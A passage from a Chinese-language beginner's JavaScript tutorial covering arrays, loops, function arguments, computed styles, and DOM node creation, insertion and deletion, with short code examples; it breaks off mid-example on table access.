<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert(json.length);     错误，json没有length</span><br><span class="line">alert(arr.length);	  正确，而数组有length</span><br></pre></td></tr></table></figure>
<ul>
<li>循环</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">for(var i=0;i&lt;arr.length;i++)</span><br><span class="line">&#123;</span><br><span class="line">	alert(&apos;第&apos;+i+&apos;个东西：&apos;+arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for(var i in arr)</span><br><span class="line">&#123;</span><br><span class="line">	alert(&apos;第&apos;+i+&apos;个东西：&apos;+arr[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="json和for-in">Json和for in</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for(var i in json)</span><br><span class="line">&#123;</span><br><span class="line">	alert(&apos;第&apos;+i+&apos;个东西：&apos;+json[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1><span id="深入javascript">深入JavaScript</span></h1><h2><span id="函数返回值">函数返回值</span></h2><h3><span id="什么是函数返回值">什么是函数返回值</span></h3><ul>
<li>函数的执行结果</li>
<li>可以没有return</li>
</ul>
<h3><span id="一个函数应该只返回一种类型的值">一个函数应该只返回一种类型的值</span></h3><h2><span id="函数传参">函数传参</span></h2><h3><span id="可变参不定参arguments">可变参（不定参）：arguments</span></h3><ul>
<li>参数的个数可变，参数数组</li>
</ul>
<p>在函数代码中，使用特殊对象 arguments，开发者无需明确指出参数名，就能访问它们。<br>arguments 对象检测函数的参数个数，引用属性 arguments.length 即可</p>
<h3><span id="取非行间样式不能用来设置">取非行间样式(不能用来设置)</span></h3><ul>
<li>obj.currentStyle[attr]         仅兼容IE</li>
<li>getComputedStyle(obj, false)[attr]          仅兼容火狐，chrome</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IE</span><br><span class="line">alert(oDiv.currentStyle.width);</span><br><span class="line"></span><br><span class="line">Chrome、FF</span><br><span class="line">alert(getComputedStyle(oDiv, false).width);      //flase 处参数可以任意</span><br></pre></td></tr></table></figure>
<h4><span id="兼容函数编写">兼容函数编写</span></h4><ul>
<li><p>style:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#div1 &#123;width:200px; height:200px; background:red;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>script:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function getStyle(obj, name)</span><br><span class="line">&#123;</span><br><span class="line">	if(obj.currentStyle)</span><br><span class="line">	&#123;</span><br><span class="line">		return obj.currentStyle[name];</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		return getComputedStyle(obj, false)[name];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;                  //函数主体</span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">		</span><br><span class="line">	//	alert(getStyle(oDiv, &apos;width&apos;));   //单一样式</span><br><span class="line">	alert(getStyle(oDiv, &apos;backgroundColor&apos;));      //复合样式 background 有图片，颜色等</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2><span id="数组基础">数组基础</span></h2><h3><span id="定义">定义</span></h3><ul>
<li>var arr=[12,5,8,9];</li>
<li>var arr=new Array[12,5,8,9];</li>
<li>没有任何差别，[]的性能略高，因为代码短</li>
</ul>
<h3><span id="数组的属性">数组的属性</span></h3><h4><span id="length">length</span></h4><ul>
<li><p>既可以获取长度，又可以设置长度</p>
</li>
<li><p>应用：快速清空数组<br>script:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var arr=[1,2,3,4,5,6];</span><br><span class="line"></span><br><span class="line">arr.length=3;   </span><br><span class="line"></span><br><span class="line">alert(arr);  //运行结果为1，2，3</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="数组的方法">数组的方法</span></h3><h4><span id="添加">添加</span></h4><ul>
<li>push(元素)，从尾部添加</li>
<li>unshift(元素)，从头部添加<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var arr=[1,2,3];</span><br><span class="line"></span><br><span class="line">arr.push(4); 	1,2,3,4</span><br><span class="line">//arr.ushift(4);   4,1,2,3</span><br><span class="line">alert(arr);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4><span id="删除">删除</span></h4><ul>
<li>pop()，从尾部弹出</li>
<li>shift()，从头部弹出</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var arr=[1,2,3];</span><br><span class="line"></span><br><span class="line">arr.pop();		1,2</span><br><span class="line">//arr.shift();  2,3   </span><br><span class="line">alert(arr);</span><br></pre></td></tr></table></figure>
<h4><span id="插入-删除splice">插入、删除(splice)</span></h4><ul>
<li><p>splice(开始, 长度,元素…)<br>先删除，后插入</p>
</li>
<li><p>splice(开始,长度)<br>删除</p>
</li>
<li><p>splice(开始, 0, 元素…)<br>插入</p>
</li>
<li><p>splice(开始，a,b1,b2..bn)   a=n<br>替换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var arr=[1,2,3,4,5,6];</span><br><span class="line"></span><br><span class="line">arr.splice(2, 3);   // 1,2,6</span><br><span class="line"></span><br><span class="line">arr.splice(2, 0, &apos;a&apos;, &apos;b&apos;, &apos;c&apos;); // 1,a,b,c,2,3,4,5,6</span><br><span class="line"></span><br><span class="line">arr.splice(2, 2, &apos;a&apos;, &apos;b&apos;);   //  1,2,a,b,5,6</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4><span id="连接-concat数组2">连接 concat(数组2)</span></h4><ul>
<li>连接两个数组<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a=[1,2,3];</span><br><span class="line">var b=[4,5,6];</span><br><span class="line">a.concat(b);   // 1,2,3,4,5,6</span><br><span class="line">b.concat(a);   // 4,5,6,1,2,3</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4><span id="拼接-join分隔符">拼接 join(分隔符)</span></h4><ul>
<li>用分隔符，组合数组元素，生成字符串</li>
<li>字符串split<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var arr=[1,2,3,4];</span><br><span class="line">arr.join(&apos;-&apos;);    //1-2-3-4</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4><span id="排序-sort比较函数">排序 sort([比较函数])</span></h4><p>sort([比较函数])，排序一个数组</p>
<ul>
<li>排序一个字符串数组</li>
<li><p>排序一个数字数组</p>
</li>
<li><p>排序一个字符串数组</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var arr=[&apos;float&apos;, &apos;width&apos;, &apos;alpha&apos;, &apos;zoom&apos;, &apos;left&apos;];</span><br><span class="line"></span><br><span class="line">arr.sort();   //alpha,float,left,width,zoom</span><br></pre></td></tr></table></figure>
</li>
<li><p>排序一个数字数组</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var arr=[12, 8, 99, 19, 112];</span><br><span class="line"></span><br><span class="line">arr.sort(function (n1, n2)&#123;</span><br><span class="line">	return n1-n2;</span><br><span class="line">	/*if(n1&lt;n2)</span><br><span class="line">	&#123;</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line">	else if(n1&gt;n2)</span><br><span class="line">	&#123;</span><br><span class="line">		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;*/</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1><span id="dom基础-1">DOM基础-1</span></h1><p>DOM 是 W3C（万维网联盟）的标准。</p>
<p>DOM 定义了访问 HTML 和 XML 文档的标准：<br>“W3C 文档对象模型 （DOM） 是中立于平台和语言的接口，它允许程序和脚本动态地访问和更新文档的内容、结构和样式。”</p>
<p>W3C DOM 标准被分为 3 个不同的部分：</p>
<pre><code>核心 DOM - 针对任何结构化文档的标准模型
XML DOM - 针对 XML 文档的标准模型
HTML DOM - 针对 HTML 文档的标准模型
</code></pre><h2><span id="dom节点-1">DOM节点-1</span></h2><p>根据 W3C 的 HTML DOM 标准，HTML 文档中的所有内容都是节点：</p>
<ul>
<li>整个文档是一个文档节点</li>
<li>每个 HTML 元素是元素节点</li>
<li>HTML 元素内的文本是文本节点</li>
<li>每个 HTML 属性是属性节点</li>
<li>注释是注释节点</li>
</ul>
<h3><span id="方法">方法</span></h3><p>一些常用的 HTML DOM 方法：</p>
<ul>
<li>getElementById(id) - 获取带有指定 id 的节点（元素）</li>
<li>appendChild(node) - 插入新的子节点（元素）</li>
<li>removeChild(node) - 删除子节点（元素）</li>
</ul>
<table>
<thead>
<tr>
<th>方法</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>getElementById()</td>
<td style="text-align:left">返回带有指定 ID 的元素。</td>
</tr>
<tr>
<td>getElementsByTagName()</td>
<td style="text-align:left">返回包含带有指定标签名称的所有元素的节点列表（集合/节点数组）。</td>
</tr>
<tr>
<td>getElementsByClassName()</td>
<td style="text-align:left">返回包含带有指定类名的所有元素的节点列表。</td>
</tr>
<tr>
<td>appendChild()</td>
<td style="text-align:left">把新的子节点添加到指定节点。</td>
</tr>
<tr>
<td>removeChild()</td>
<td style="text-align:left">删除子节点。</td>
</tr>
<tr>
<td>replaceChild()</td>
<td style="text-align:left">替换子节点。</td>
</tr>
<tr>
<td>insertBefore()</td>
<td style="text-align:left">在指定的子节点前面插入新的子节点。</td>
</tr>
<tr>
<td>createAttribute()</td>
<td style="text-align:left">创建属性节点。</td>
</tr>
<tr>
<td>createElement()</td>
<td style="text-align:left">创建元素节点。</td>
</tr>
<tr>
<td>createTextNode()</td>
<td style="text-align:left">创建文本节点。</td>
</tr>
<tr>
<td>getAttribute()</td>
<td style="text-align:left">返回指定的属性值。</td>
</tr>
<tr>
<td>setAttribute()</td>
<td style="text-align:left">把指定属性设置或修改为指定的值。</td>
</tr>
</tbody>
</table>
<h3><span id="属性">属性</span></h3><p>属性是节点（HTML 元素）的值，您能够获取或设置。</p>
<h4><span id="innerhtml">innerHTML</span></h4><p>获取元素内容的最简单方法是使用 innerHTML 属性。</p>
<p>innerHTML 属性对于获取或替换 HTML 元素的内容很有用。</p>
<h4><span id="nodename">nodeName</span></h4><p>nodeName 属性规定节点的名称。</p>
<ul>
<li>nodeName 是只读的</li>
<li>元素节点的 nodeName 与标签名相同</li>
<li>属性节点的 nodeName 与属性名相同</li>
<li>文本节点的 nodeName 始终是 ##text</li>
<li>文档节点的 nodeName 始终是 ##document</li>
</ul>
<p>注释：nodeName 始终包含 HTML 元素的大写字母标签名。</p>
<h4><span id="nodevalue">nodeValue</span></h4><p>nodeValue 属性规定节点的值。</p>
<ul>
<li>元素节点的 nodeValue 是 undefined 或 null</li>
<li>文本节点的 nodeValue 是文本本身</li>
<li>属性节点的 nodeValue 是属性值</li>
</ul>
<h4><span id="nodetype">nodeType</span></h4><p>nodeType 属性返回节点的类型。nodeType 是只读的。</p>
<p>比较重要的节点类型有：</p>
<table>
<thead>
<tr>
<th>元素类型</th>
<th style="text-align:left">NodeType</th>
</tr>
</thead>
<tbody>
<tr>
<td>元素</td>
<td style="text-align:left">1</td>
</tr>
<tr>
<td>属性</td>
<td style="text-align:left">2</td>
</tr>
<tr>
<td>文本</td>
<td style="text-align:left">3</td>
</tr>
<tr>
<td>注释</td>
<td style="text-align:left">8</td>
</tr>
<tr>
<td>文档</td>
<td style="text-align:left">9</td>
</tr>
</tbody>
</table>
<h1><span id="dom基础-2">DOM基础-2</span></h1><h2><span id="循环子节点">循环子节点</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">var oUl=document.getElementById(&apos;ul1&apos;);</span><br><span class="line"></span><br><span class="line">//IE6-8</span><br><span class="line">//alert(oUl.childNodes.length);</span><br><span class="line">for(var i=0;i&lt;oUl.childNodes.length;i++)</span><br><span class="line">&#123;</span><br><span class="line">	//nodeType==3	-&gt;	文本节点</span><br><span class="line">	//nodeType==1	-&gt;	元素节点</span><br><span class="line">	//alert(oUl.childNodes[i].nodeType);</span><br><span class="line">	</span><br><span class="line">	if(oUl.childNodes[i].nodeType==1)</span><br><span class="line">	&#123;</span><br><span class="line">		oUl.childNodes[i].style.background=&apos;red&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>兼容，不算文本节点，只算元素。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var oUl=document.getElementById(&apos;ul1&apos;);</span><br><span class="line"></span><br><span class="line">alert(oUl.children.length);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2><span id="parentnode">parentNode</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">	var oUl=document.getElementById(&apos;ul1&apos;);</span><br><span class="line"></span><br><span class="line">	alert(oUl.parentNode);</span><br><span class="line">	</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;ul id=&quot;ul1&quot;&gt;</span><br><span class="line">	&lt;li&gt;&lt;/li&gt;</span><br><span class="line">	&lt;li&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="offsetparent">offsetParent</span></h2><p>获取定位的父级</p>
<h2><span id="首位子节点">首位子节点</span></h2><h3><span id="firstchild-lastchild">firstChild、lastChild</span></h3><p>获取首位子节点（包括文本）</p>
<h3><span id="firstelementchild-lastelementchild">firstElementChild lastElementChild</span></h3><p>获取首位元素</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var oUl=document.getElementById(&apos;ul1&apos;);</span><br><span class="line"></span><br><span class="line">//IE6-8</span><br><span class="line">//oUl.firstChild.style.background=&apos;red&apos;;</span><br><span class="line"></span><br><span class="line">//高级浏览器</span><br><span class="line">//oUl.firstElementChild.style.background=&apos;red&apos;;</span><br><span class="line"></span><br><span class="line">if(oUl.firstElementChild)</span><br><span class="line">&#123;</span><br><span class="line">	oUl.firstElementChild.style.background=&apos;red&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	oUl.firstChild.style.background=&apos;red&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2><span id="元素属性操作">元素属性操作</span></h2><p>元素属性操作</p>
<ul>
<li>第一种：oDiv.style.display=“block”;</li>
<li>第二种：oDiv.style[“display”]=“block”;</li>
<li>第三种：Dom方式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var oTxt=document.getElementById(&apos;txt1&apos;);</span><br><span class="line">var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line"></span><br><span class="line">oBtn.onclick=function ()</span><br><span class="line">&#123;</span><br><span class="line">	//oTxt.value=&apos;asdfasd&apos;;</span><br><span class="line">	//oTxt[&apos;value&apos;]=&apos;xczcvb&apos;;</span><br><span class="line">	</span><br><span class="line">	oTxt.setAttribute(&apos;value&apos;, &apos;erwertwert&apos;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>DOM方式操作元素属性</p>
<ul>
<li>获取：getAttribute(名称)</li>
<li>设置：setAttribute(名称, 值)</li>
<li>删除：removeAttribute(名称)</li>
</ul>
<h2><span id="dom元素灵活查找">DOM元素灵活查找</span></h2><h3><span id="用classname选择元素">用className选择元素</span></h3><ul>
<li><p>如何用className选择元素<br>选出所有元素<br>通过className条件筛选</p>
</li>
<li><p>封装成函数</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function getByClass(oParent, sClass)</span><br><span class="line">&#123;</span><br><span class="line">	var aResult=[];</span><br><span class="line">	var aEle=oParent.getElementsByTagName(&apos;*&apos;);  //通配符 所有标签</span><br><span class="line">	</span><br><span class="line">	for(var i=0;i&lt;aEle.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if(aEle[i].className==sClass)</span><br><span class="line">		&#123;</span><br><span class="line">			aResult.push(aEle[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	return aResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1><span id="dom操作应用">DOM操作应用</span></h1><h2><span id="创建-插入和删除元素">创建、插入和删除元素</span></h2><h3><span id="创建dom元素">创建DOM元素</span></h3><ul>
<li>createElement(标签名)        创建一个节点</li>
<li>appendChild(节点)            追加一个节点<br>例子：为ul插入li<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	var oUl=document.getElementById(&apos;ul1&apos;);</span><br><span class="line">	var oTxt=document.getElementById(&apos;txt1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		var oLi=document.createElement(&apos;li&apos;);</span><br><span class="line">		</span><br><span class="line">		oLi.innerHTML=oTxt.value;</span><br><span class="line">		</span><br><span class="line">		//父级.appendChild(子节点);</span><br><span class="line">		oUl.appendChild(oLi);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;input id=&quot;txt1&quot; type=&quot;text&quot;/&gt;</span><br><span class="line">&lt;input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;创建li&quot;/&gt;</span><br><span class="line">&lt;ul id=&quot;ul1&quot;&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">// 追加一个节点</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="插入元素">插入元素</span></h3><ul>
<li>insertBefore(节点, 原有节点)    在已有元素前插入<br>例子：倒序插入li<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	var oUl=document.getElementById(&apos;ul1&apos;);</span><br><span class="line">	var oTxt=document.getElementById(&apos;txt1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		var oLi=document.createElement(&apos;li&apos;);</span><br><span class="line">		var aLi=oUl.getElementsByTagName(&apos;li&apos;);</span><br><span class="line">		</span><br><span class="line">		oLi.innerHTML=oTxt.value;</span><br><span class="line">		</span><br><span class="line">		//父级.appendChild(子节点);</span><br><span class="line">		//oUl.appendChild(oLi);</span><br><span class="line">		if(aLi.length&gt;0)         //判断是不是第一个节点</span><br><span class="line">		&#123;</span><br><span class="line">			oUl.insertBefore(oLi, aLi[0]);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			oUl.appendChild(oLi);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input id=&quot;txt1&quot; type=&quot;text&quot;/&gt;</span><br><span class="line">&lt;input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;创建li&quot;/&gt;</span><br><span class="line">&lt;ul id=&quot;ul1&quot;&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="删除dom元素">删除DOM元素</span></h3><ul>
<li>removeChild(节点)            删除一个节点<br>例子：删除li</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function ()</span><br><span class="line">&#123;</span><br><span class="line">	var aA=document.getElementsByTagName(&apos;a&apos;);</span><br><span class="line">	var oUl=document.getElementById(&apos;ul1&apos;);</span><br><span class="line">	</span><br><span class="line">	for(var i=0;i&lt;aA.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		aA[i].onclick=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			oUl.removeChild(this.parentNode);</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;ul id=&quot;ul1&quot;&gt;</span><br><span class="line">	&lt;li&gt;asfasd &lt;a href=&quot;javascript:;&quot;&gt;删除&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">	&lt;li&gt;5645 &lt;a href=&quot;javascript:;&quot;&gt;删除&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">	&lt;li&gt;ghdfjgj &lt;a href=&quot;javascript:;&quot;&gt;删除&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">	&lt;li&gt;mvbnmvnb &lt;a href=&quot;javascript:;&quot;&gt;删除&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="文档碎片">文档碎片</span></h2><ul>
<li>仅在低级的浏览器上才能提高性能</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oUl=document.getElementById(&apos;ul1&apos;);</span><br><span class="line">	var oFrag=document.createDocumentFragment();  //创建一个文档碎片</span><br><span class="line">	</span><br><span class="line">	for(var i=0;i&lt;10000;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		var oLi=document.createElement(&apos;li&apos;);</span><br><span class="line">		</span><br><span class="line">		oFrag.appendChild(oLi);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	oUl.appendChild(oFrag);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;ul id=&quot;ul1&quot;&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
<h1><span id="dom操作应用高级">DOM操作应用高级</span></h1><h2><span id="表格应用">表格应用</span></h2><h3><span id="获取">获取</span></h3><p>tBodies、tHead、tFoot、rows、cells</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oTab=document.getElementById(&apos;tab1&apos;);</span><br><span class="line">	</span><br><span class="line">	//alert(oTab.getElementsByTagName(&apos;tbody&apos;)[0].getElementsByTagName(&apos;tr&apos;)[1].getElementsByTagName(&apos;td&apos;)[1].innerHTML);</span><br><span class="line">	